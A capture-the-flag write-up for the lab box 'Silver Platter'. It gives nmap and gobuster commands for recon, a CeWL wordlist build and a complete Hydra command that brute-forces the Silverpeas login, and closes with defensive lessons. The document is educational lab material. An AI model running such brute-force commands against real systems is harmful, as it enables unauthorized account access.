# Silver Platter

**Difficulty:** Easy
**Techniques:** vhost/CMS enum · Silverpeas auth brute (Hydra + CeWL wordlist)

## Recon
```bash
nmap -sS -Pn -p- -T4 -A -oN scan.nmap <ip>
```
```
22/tcp   open  ssh   OpenSSH 8.9p1
80/tcp   open  http  nginx 1.18.0   → "Hack Smarter Security"
8080/tcp open  http  (Silverpeas app behind it)
```

## Enumeration
```bash
gobuster dir  -u http://<ip>/         -w .../common.txt -x js,txt,html
gobuster dir  -u http://<ip>:8080     -w .../common.txt -x php,html,txt
#   console → /noredirect.html
#   website → /website/
```
Hostnames discovered and added to `/etc/hosts`:
`silverpeas.thm`, `scr1ptkiddy.thm`. The app is **Silverpeas** at
`http://silverpeas.thm:8080/silverpeas/defaultLogin.jsp`.

The front page / blog hinted at a user handle `scr1ptkiddy`.

## Exploitation — targeted brute force
Built a wordlist from the site content with CeWL, then brute-forced the Silverpeas
login with Hydra:
```bash
cewl http://silverplatter.thm > passwords.txt
hydra -l scr1ptkiddy -P passwords.txt silverplatter.thm -s 8080 \
  http-post-form "/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
# [8080] login: scr1ptkiddy  password: adipi****
```
Valid credentials → authenticated access to Silverpeas; from there the chain
continues to messaging/credential disclosure and a shell (foothold → SSH).

## Lessons
- Site-derived wordlists (CeWL) beat generic lists for app-specific logins.
- Exposed usernames + weak passwords = Hydra foothold; enforce lockout + strong
  passwords (exactly what the SOC lab's VPN portal brute-force rule detects).
